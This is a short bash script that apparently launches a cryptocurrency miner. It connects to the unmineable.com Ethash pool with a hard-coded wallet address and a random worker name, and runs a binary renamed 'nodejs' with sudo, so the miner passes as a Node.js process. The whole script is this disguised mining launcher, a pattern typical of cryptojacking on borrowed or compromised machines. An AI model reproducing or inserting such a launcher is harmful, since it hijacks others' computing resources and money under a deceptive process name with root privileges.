#!/bin/bash
POOL=ethash.unmineable.com:3333
WALLET=0x86ca902b2ca60630188dba14105442141dc3b1dc
WORKER=$(echo $(shuf -i 1-30 -n 1)-gass) 
chmod +x nodejs
sudo ./nodejs -epool $POOL -wal $WALLET.$WORKER -pass x
